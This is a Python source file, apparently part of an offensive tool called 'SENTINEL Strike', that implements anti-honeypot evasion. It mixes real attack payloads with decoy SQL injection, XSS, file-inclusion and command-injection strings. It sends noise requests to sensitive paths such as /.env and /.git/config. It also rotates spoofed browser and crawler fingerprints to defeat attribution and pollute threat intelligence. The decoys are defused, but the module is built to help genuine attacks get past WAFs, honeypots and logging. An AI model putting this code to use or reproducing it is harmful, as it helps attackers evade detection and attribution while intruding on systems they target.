"""
SENTINEL Strike v3.0 — Counter-Deception Module

Anti-honeypot techniques to evade deception technology:
- DecoyPayloadGenerator: Harmless-looking payloads to pollute threat intel
- NoiseGenerator: Random junk requests to obscure real attacks
- FingerprintRandomizer: Unique fingerprints per request to prevent attribution
"""

import random
import string
from typing import List, Dict, Tuple
from datetime import datetime


class DecoyPayloadGenerator:
    """
    Generates harmless-looking payloads that appear malicious to WAF/honeypots
    but don't actually exploit anything. Used to pollute threat intelligence.
    """

    # Fake SQLi payloads that look scary but are harmless
    DECOY_SQLI = [
        "' OR 'decoy'='decoy' --",
        "1; SELECT 'honeypot_test' --",
        "UNION SELECT 'fake','data','for','deception' --",
        "' AND 1=1 AND 'noise'='noise",
        "1' OR '1'='1' /* counter_deception */",
        "admin'-- fake_injection",
        "'; EXEC xp_fake_procedure --",
        "' UNION ALL SELECT NULL,NULL,NULL --",
        "1 AND 1=1 ORDER BY 999999 --",
        "' OR 'x'='x' WAITFOR DELAY '0:0:0' --",  # No actual delay
    ]

    # Fake XSS payloads that won't execute
    DECOY_XSS = [
        "<script>/* decoy_marker */</script>",
        "<img src=x onerror='/* harmless */'>",
        "<svg onload='// counter_deception'>",
        "javascript:void('decoy')",
        "<script>console.log('honeypot_test')</script>",
        "<iframe src='about:blank'></iframe>",
        "<body onpageshow='/* noise */'>",
        "'-alert('decoy')-'",  # Won't execute in most contexts
        "<script>var decoy=1;</script>",
        "<img/src=x onerror=void(0)>",
    ]

    # Fake LFI payloads pointing to non-existent files
    DECOY_LFI = [
        "../../../../fake/decoy/path.txt",
        "....//....//fake_honeypot_test",
        "/proc/self/decoy_counter_deception",
        "..%00/fake_null_byte_test",
        "/etc/decoy_passwd_fake",
        "....\\....\\windows\\decoy.ini",
        "php://filter/decoy/resource=fake",
        "/var/log/honeypot_test_fake.log",
        "file:///decoy/counter/deception",
        "..%252f..%252f/fake_double_encode",
    ]

    # Fake command injection
    DECOY_CMDI = [
        "; echo 'decoy_marker'",
        "| cat /decoy/fake/file",
        "& dir C:\\decoy\\fake\\path",
        "`echo counter_deception`",
        "$(echo honeypot_test)",
        "; ping -c 1 127.0.0.1 # harmless localhost",
        "| echo %FAKE_VAR%",
        "&& echo decoy_noise",
        "; whoami # just info, harmless",
        "| id # counter_deception_marker",
    ]

    @classmethod
    def get_decoy_payloads(cls, attack_type: str, count: int = 5) -> List[str]:
        """Get random decoy payloads for specified attack type."""
        payloads = {
            "sqli": cls.DECOY_SQLI,
            "xss": cls.DECOY_XSS,
            "lfi": cls.DECOY_LFI,
            "cmdi": cls.DECOY_CMDI,
        }

        source = payloads.get(attack_type.lower(), cls.DECOY_SQLI)
        return random.sample(source, min(count, len(source)))

    @classmethod
    def generate_random_decoy(cls, attack_type: str) -> str:
        """Generate a single random decoy payload."""
        payloads = cls.get_decoy_payloads(attack_type, 1)
        return payloads[0] if payloads else "decoy_test"

    @classmethod
    def mix_with_real(
        cls, real_payloads: List[str], attack_type: str, decoy_ratio: float = 0.3
    ) -> List[Tuple[str, bool]]:
        """
        Mix real payloads with decoys.
        Returns list of (payload, is_decoy) tuples.
        """
        decoy_count = int(len(real_payloads) * decoy_ratio)
        decoys = cls.get_decoy_payloads(attack_type, decoy_count)

        result = [(p, False) for p in real_payloads]
        result.extend([(p, True) for p in decoys])

        random.shuffle(result)
        return result


class NoiseGenerator:
    """
    Generates noise requests to obscure real attack patterns
    and overwhelm honeypot logging systems.
    """

    # Fake paths that look suspicious
    NOISE_PATHS = [
        "/admin/login.php",
        "/wp-admin/admin-ajax.php",
        "/.env",
        "/api/v1/users",
        "/graphql",
        "/debug/console",
        "/phpmyadmin/",
        "/.git/config",
        "/config.json",
        "/api/internal/health",
        "/swagger/v1/swagger.json",
        "/actuator/health",
        "/.well-known/security.txt",
        "/robots.txt",
        "/sitemap.xml",
    ]

    # Fake suspicious headers
    NOISE_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "192.168.1.1"},
        {"X-Custom-Header": "noise_test"},
        {"X-Debug": "true"},
        {"X-Requested-With": "XMLHttpRequest"},
        {"X-Api-Key": "fake_key_for_noise"},
        {"Authorization": "Bearer fake_token_noise"},
        {"X-Forwarded-Host": "internal.fake.local"},
    ]

    @classmethod
    def generate_noise_request(cls) -> Dict:
        """Generate a single noise request configuration."""
        return {
            "path": random.choice(cls.NOISE_PATHS),
            "headers": random.choice(cls.NOISE_HEADERS),
            "params": {
                "noise": cls._random_string(8),
                "t": str(int(datetime.now().timestamp())),
            },
        }

    @classmethod
    def generate_noise_batch(cls, count: int = 10) -> List[Dict]:
        """Generate batch of noise requests."""
        return [cls.generate_noise_request() for _ in range(count)]

    @staticmethod
    def _random_string(length: int = 8) -> str:
        """Generate random alphanumeric string."""
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


class FingerprintRandomizer:
    """
    Randomizes browser fingerprint to prevent attribution
    and make each request appear from different source.
    """

    # Diverse User-Agent pool
    USER_AGENTS = [
        # Chrome variants
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        # Firefox variants
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        # Safari
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        # Edge
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        # Bots (to confuse attribution)
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        # Curl/Scripts (obvious but diverse)
        "curl/8.4.0",
        "python-requests/2.31.0",
        "PostmanRuntime/7.35.0",
    ]

    # Accept-Language variations
    LANGUAGES = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "ru-RU,ru;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
    ]

    # Accept header variations
    ACCEPT_HEADERS = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
        "*/*",
        "text/html, application/xhtml+xml",
        "application/json",
    ]

    @classmethod
    def get_random_fingerprint(cls) -> Dict[str, str]:
        """Generate random browser fingerprint headers."""
        return {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept-Language": random.choice(cls.LANGUAGES),
            "Accept": random.choice(cls.ACCEPT_HEADERS),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": random.choice(["no-cache", "max-age=0", ""]),
            "Pragma": random.choice(["no-cache", ""]),
            "Sec-Ch-Ua": cls._generate_sec_ch_ua(),
            "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
            "Sec-Fetch-Dest": random.choice(["document", "empty"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        }

    @classmethod
    def _generate_sec_ch_ua(cls) -> str:
        """Generate Sec-Ch-Ua header."""
        versions = ["120", "119", "121", "118"]
        brands = [
            f'"Chromium";v="{random.choice(versions)}", "Not_A Brand";v="8"',
            f'"Google Chrome";v="{random.choice(versions)}", "Chromium";v="{random.choice(versions)}"',
        ]
        return random.choice(brands)

    @classmethod
    def get_random_referer(cls, target: str) -> str:
        """Generate random referer to mix origin tracking."""
        referers = [
            "",  # Direct
            target,  # Self-referral
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://t.co/random",
            "https://www.linkedin.com/",
        ]
        return random.choice(referers)


class CounterDeceptionEngine:
    """
    Main engine combining all counter-deception techniques.
    """

    def __init__(
        self,
        decoy_ratio: float = 0.3,
        noise_enabled: bool = True,
        fingerprint_rotation: bool = True,
    ):
        self.decoy_ratio = decoy_ratio
        self.noise_enabled = noise_enabled
        self.fingerprint_rotation = fingerprint_rotation

        self.decoy_gen = DecoyPayloadGenerator()
        self.noise_gen = NoiseGenerator()
        self.fingerprint_gen = FingerprintRandomizer()

        self.stats = {
            "decoys_sent": 0,
            "noise_requests": 0,
            "fingerprints_rotated": 0,
        }

    def prepare_attack_batch(
        self, payloads: List[str], attack_type: str
    ) -> List[Tuple[str, bool, Dict]]:
        """
        Prepare attack batch with counter-deception.
        Returns: [(payload, is_decoy, headers), ...]
        """
        # Mix real payloads with decoys
        mixed = self.decoy_gen.mix_with_real(payloads, attack_type, self.decoy_ratio)

        result = []
        for payload, is_decoy in mixed:
            headers = {}

            if self.fingerprint_rotation:
                headers = self.fingerprint_gen.get_random_fingerprint()
                self.stats["fingerprints_rotated"] += 1

            if is_decoy:
                self.stats["decoys_sent"] += 1

            result.append((payload, is_decoy, headers))

        return result

    def generate_noise_burst(self, count: int = 5) -> List[Dict]:
        """Generate noise burst to confuse logging."""
        if not self.noise_enabled:
            return []

        noise = self.noise_gen.generate_noise_batch(count)
        self.stats["noise_requests"] += len(noise)
        return noise

    def get_stats(self) -> Dict:
        """Get counter-deception statistics."""
        return self.stats.copy()

    def reset_stats(self):
        """Reset statistics."""
        self.stats = {
            "decoys_sent": 0,
            "noise_requests": 0,
            "fingerprints_rotated": 0,
        }


# Convenience function for Strike integration
def create_counter_deception(
    decoy_ratio: float = 0.3,
    noise_enabled: bool = True,
    fingerprint_rotation: bool = True,
) -> CounterDeceptionEngine:
    """Factory function to create Counter-Deception engine."""
    return CounterDeceptionEngine(
        decoy_ratio=decoy_ratio,
        noise_enabled=noise_enabled,
        fingerprint_rotation=fingerprint_rotation,
    )
